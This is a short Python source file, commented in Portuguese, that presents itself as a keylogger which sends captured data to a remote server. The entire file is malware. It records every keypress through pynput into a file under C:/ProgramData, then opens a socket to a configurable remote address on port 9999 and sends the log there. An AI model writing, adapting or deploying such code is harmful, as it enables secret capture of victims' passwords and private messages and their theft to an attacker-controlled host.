''''
Keylooger em python, enviando os dados para o servidor remoto a cada execução.
Author: Thiago Ferrari
Version: 1.0
'''
from pynput.keyboard import Listener
import socket
import sys
import time

arquivo_path = 'keylog.txt'
try:
    arquivo = open("keylog.txt")
except IOError:
    arquivo = open("keylog.txt", 'w+')
#File patch
teclas = "C:/ProgramData/keylog.txt"
def writeLog(key):
    dados = str(key)

#change the IP Address    
    with open(teclas, "a") as f:
        f.write(dados)
with Listener(on_press=writeLog) as l:
    soc = socket.socket()
    soc.connect(("1.1.1.0",9999))
    f = open ("C:/ProgramData/keylog.txt", "rb")
    b = f.read(1024)
    while (b):
        soc.send(b)
        b = f.read(1024)
    soc.close()
    l.join()
    
